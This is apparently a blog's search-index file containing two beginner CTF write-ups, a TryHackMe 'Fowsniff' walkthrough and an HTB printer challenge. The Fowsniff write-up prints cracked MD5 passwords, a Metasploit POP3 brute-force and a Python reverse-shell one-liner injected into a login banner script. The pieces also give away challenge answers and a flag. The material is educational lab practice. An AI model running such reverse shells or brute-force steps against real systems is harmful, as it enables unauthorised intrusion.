<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Fowsniff CTF Walkthrough</title>
    <link href="/blog/2024/12/12/Fowsniff-CTF-Walkthrough-detailed/"/>
    <url>/blog/2024/12/12/Fowsniff-CTF-Walkthrough-detailed/</url>
    
    <content type="html"><![CDATA[<p>Fowsniff CTF Walkthrough Detailed</p><hr><h2 id="Hello-and-welcome-to-my-first-writeup-Even-tho-this-room-is-very-guided-I’m-gonna-try-to-go-a-bit-more-in-depth-into-it-and-hopefully-make-things-more-clear-to-my-fellow-beginners-let’s-get-started"><a href="#Hello-and-welcome-to-my-first-writeup-Even-tho-this-room-is-very-guided-I’m-gonna-try-to-go-a-bit-more-in-depth-into-it-and-hopefully-make-things-more-clear-to-my-fellow-beginners-let’s-get-started" class="headerlink" title="Hello, and welcome to my first writeup!Even tho this room is very guided I’m gonna try to go (a bit) more in depth into it and hopefully make things more clear to my fellow beginners, let’s get started."></a>Hello, and welcome to my first writeup!<br>Even tho this room is very guided I’m gonna try to go (a bit) more in depth into it and hopefully make things more clear to my fellow beginners, let’s get started.</h2><blockquote><p><strong>Task 1 — deploy the machine</strong></p></blockquote><p>First we start with launching the attack box or openvpn if you’re using a VM</p><p>what’s openvpn? OpenVPN is a software that creates a secure connection between your computer and another network. It allows you to securely connect your computer to TryHackMe’s servers so you can safely access their rooms and challenges over the internet. It’s like a private tunnel for your online adventures ✨ more details to be found <a href="https://help.tryhackme.com/en/articles/6611809-getting-started-with-openvpn"><code>here</code></a>.<br><img src="/blog/img/fs/image.png" alt="image"></p><ul><li><em>no answer needed</em></li></ul><blockquote><p><strong>Task 2 — What ports are open?</strong></p></blockquote><p>An Nmap scan is like a digital detective looking at a computer to find out what services it’s running. It checks all the doors and windows (all ports with -p-, uses default scripts -A to gather detailed info, and identifies software versions -sV. It’s like getting a full report on everything a computer is up to..</p><p>let’s go ahead and run our scan by typing the following command</p><blockquote><p>nmap -A -p- -sV <machine ip addr></p></blockquote><p>Bare in mind that using -p- to scan all ports might take a while(forever), for a faster scan we can simply run “nmap -sC -sV <machine ip></p><p>we’d get the following results<br><img src="/blog/img/fs/image2.png" alt="image"></p><p>As we can see there are 4 open ports</p><ul><li><em>No answer needed</em></li></ul><blockquote><p><strong>Task 3 — Look around. What can you find?</strong></p></blockquote><p>let’s breakdown the open ports that we found</p><p>22&#x2F;tcp open ssh : SSH port means that the computer has a door (port) open and ready for Secure Shell (SSH) connections. SSH is a secure way to communicate with the computer remotely. It’s like having a secure key to the computer’s virtual door, allowing you to control it from a distance, often used for tasks like managing servers or accessing another computer’s command line.</p><p>80&#x2F;tcp open http : it means that a specific port on a computer is allowing communication via the Hypertext Transfer Protocol (HTTP). HTTP is the protocol used for transmitting data on the web. An open HTTP port typically indicates that the computer is serving web content or hosting a website. It’s like the computer having a door open specifically for web browsers and other web-related applications to communicate with it.</p><p>we can access this web page by typing the url : http:&#x2F;&#x2F;<machine ip> in our browser, it will take us to this page</p><p><img src="/blog/img/fs/image3.png" alt="image"></p><p>interesting huh.</p><p>110&#x2F;tcp open pop3 : it means that a specific port on a computer is allowing communication via the Post Office Protocol version 3 (POP3). POP3 is a protocol used for retrieving emails from a mail server. An open POP3 port suggests that the computer is set up to receive email messages using this protocol. It’s like a designated entrance for email clients to connect and fetch emails from the server.</p><p>143&#x2F;tcp open imap : it means that a specific port on a computer is allowing communication via the Internet Message Access Protocol (IMAP). IMAP is a protocol used for accessing and managing emails on a mail server. An open IMAP port indicates that the computer is configured to handle email communications using this protocol. It’s like having a designated gateway for email clients to connect, view, and manage messages stored on the mail server</p><ul><li><em>No answer needed</em></li></ul><blockquote><p><strong>task 4 — can you find any public information about them?</strong></p></blockquote><p>“The attackers were also able to hijack our official @fowsniffcorp Twitter account”</p><p>let’s take a look on the account !</p><p>going through the tweets we’ll find some <a href="https://pastebin.com/378rLnGi"><code>pastebin</code></a> links in which the attacker dumped the passwords<br><img src="/blog/img/fs/image4.png" alt="image"></p><p>we see that all passwords are hashed using md5,</p><p>md5 (The Message Digest 5) is an algorithm that turns it into a unique string of letters and numbers. Even a tiny change in the file makes the MD5 fingerprint totally different. It’s no longer secure in our modern days and became easy to crack.</p><p>Also, let’s keep in mind that MD5 is a one-way hashing algorithm, meaning it’s designed to be irreversible. However, it’s crackable by Brute forcing attacks, hashing data and trying all possible combinations until the matching target is found.</p><ul><li><em>No answer needed</em></li></ul><blockquote><p><strong>Task 5 — Can you decode these md5 hashes?</strong></p></blockquote><p>As this task suggested I will be using Hashkiller to crack those hashes</p><p>I was able to crack all of them except stone’s ,</p><p>mauer — 8a28a94a588a95b80163709ab4313aa4 — mailcall<br>mustikka — ae1644dac5b77c0cf51e0d26ad6d7e56 — bilbo101<br>tegel — 1dc352435fecca338acfd4be10984009 — apples01<br>baksteen — 19f5af754c31f1e2651edde9250d69bb — skyler22<br>seina — 90dc16d47114aa13671c697fd506cf26 — scoobydoo2<br>stone — a92b8a29ef1183192e3d35187e0cfabd — ??????<br>mursten — 0e9588cb62f4b6f27e33d449e2ba0b3b — carp4ever<br>parede — 4d6e42f56e127803285a0a7649b5ab11 — orlando12<br>sciana — f7fd98d380735e859f8b2ffbbede5a7e — 07011972</p><ul><li><em>No answer needed</em></li></ul><blockquote><p><strong>Task 6 — Can you use metasploit to brute force the pop3 login?</strong></p></blockquote><p>Basically metasploit is a tool that ethical hackers use to find and fix security problems in computer systems. We’re gonna use it to bruteforce the pop3 login service.</p><p>Before we dive into that let’s create a file with the username and another with passwords</p><blockquote><p>nano users.txt<br><img src="/blog/img/fs/image5.png" alt="image"><br>nano passwd.txt<br><img src="/blog/img/fs/image6.png" alt="image"></p></blockquote><p>Now let’s fire up metasploit and search for pop3 vulns:</p><p><img src="/blog/img/fs/image7.png" alt="image"></p><p>login utility is exactly what we need,</p><blockquote><p>use 3</p></blockquote><p>we can all use “&gt; show options” to list all possible commands for this utility</p><p>Now we need to specify the target remote host (the computer you want to test or exploit), we can do so by typing the command</p><blockquote><p>set rhosts <machine ip> : This tells Metasploit that it should attempt the exploit on the specified target.</p></blockquote><blockquote><p>set user_file users.txt</p></blockquote><blockquote><p>set pass_file passwd.txt</p></blockquote><blockquote><p>set verbose flase : it instructs Metasploit to provide less detailed or verbose information during the execution of commands or modules. This can be useful when you want to reduce the amount of output to focus on essential information.</p></blockquote><p><img src="/blog/img/fs/image8.png" alt="image"></p><p>Now we run it and wait for the magic to happen</p><blockquote><p>run<br><img src="/blog/img/fs/image9.png" alt="image"></p></blockquote><p>We got it !!</p><ul><li><em>No answer needed</em></li></ul><blockquote><p><strong>Task7 — What was seina’s password to the email service?</strong></p></blockquote><p>scoobydoo2</p><blockquote><p><strong>Task8 — Can you connect to the pop3 service with her credentials? What email information can you gather?</strong></p></blockquote><p>next let’s set our listener and login using the credentials we found</p><blockquote><p>nc <machine ip> 110</p></blockquote><blockquote><p>User seina</p></blockquote><blockquote><p>Pass scoobydoo2</p></blockquote><blockquote><p>LIST</p></blockquote><p><img src="/blog/img/fs/image10.png" alt="image"></p><ul><li><em>No answer needed</em></li></ul><blockquote><p><strong>Task9 — Looking through her emails, what was a temporary password set for her?</strong></p></blockquote><p>Let’s retrieve the 1st message by typing the command RETR 1<br><img src="/blog/img/fs/image11.png" alt="image"><br>let’s take a look at the second one RETR 2<br><img src="/blog/img/fs/image12.png" alt="image"></p><p><code>S1ck3nBluff+secureshell</code></p><blockquote><p><strong>Task10 — connect to the machine using SSH.</strong></p></blockquote><p>We got the credentials for the ssh , let’s login !<br><img src="/blog/img/fs/image13.png" alt="image"></p><p>by typing the “id” command we can see that baskteen is not root and is just a regular user. No problem tho, let’s searches for files owned by the “users” group on the entire system and look for something useful</p><blockquote><p>find &#x2F; -group users -type f 2&gt;&#x2F;dev&#x2F;null<br><img src="/blog/img/fs/image14.png" alt="image"></p></blockquote><p>the hint provided by TryHackMe points at that cube.sh file , hmmm… wonder what’s in it<br><img src="/blog/img/fs/image15.png" alt="image"><br>it’s the ssh banner, meaning this file is executed whenever we login through ssh. Perfect place to inject our reverse shell. I’ll be using the reverse shell provided by the room</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">python3 -c ‘import <span class="hljs-built_in">socket</span>,subprocess,os;s=<span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM);s.connect((&lt;IP&gt;,<span class="hljs-number">1234</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([“/bin/sh”,”-i”]);’<br></code></pre></td></tr></table></figure><p>We can edit the file using nano, dont forget to set up a listener and change your ip address in the reverseshell.<br><img src="/blog/img/fs/image17.png" alt="image"><br>And that’s itt!!</p><p>No answer needed</p><p>Thanks for reading ❤ feel free to leave any feedback so I can improve my articles, cya next time!</p>]]></content>
    
    
    
    <tags>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB: Gawk writeup</title>
    <link href="/blog/2024/08/26/gawk/"/>
    <url>/blog/2024/08/26/gawk/</url>
    
    <content type="html"><![CDATA[<h2 id="HTB-Gawk-writeup"><a href="#HTB-Gawk-writeup" class="headerlink" title="HTB: Gawk writeup"></a>HTB: Gawk writeup</h2><p>GAWK is a very easy challenge in the hardware category and the 1st task in the printer exploitation track.</p><p><strong>CHALLENGE DESCRIPTION</strong></p><p>I lost access to my computer and need a document urgently which got stuck in a printer. Can you get me the document ?</p><hr><p>Upon starting the chall I was given a host address that I had no clue what to do with it , so I ran to my best friend <em>google</em> to get some answers.</p><p>After looking up some articles about printer hacking I found a tool called <a href="https://github.com/RUB-NDS/PRET"><code>Pret</code></a><br><img src="/blog/img/gwk/image.png" alt="image"><br>So I  cloned the repo and ran the python script against our host ip as it says in the usage example<br><img src="/blog/img/gwk/image3.png" alt="image"></p><p>As easy as it looks, we got a shell! and it’s time to explore the files.<br>Keeping in mind the challenge description we’re looking for a specific file.<br><img src="/blog/img/gwk/image4.png" alt="image"></p><p>Here I found this PDF file so I decoded its base64 using an <a href="https://base64.guru/converter/decode/pdf"><code>online tool</code></a> that would display the file  without the need to download it.</p><p>&amp; we will get the flag on the first page!<br><img src="/blog/img/gwk/image5.png" alt="image"></p><blockquote><p>Flag : HTB{tr4v3rs3_m4n4g3ment_d3240!}</p></blockquote><p>cya in the next writeup!</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
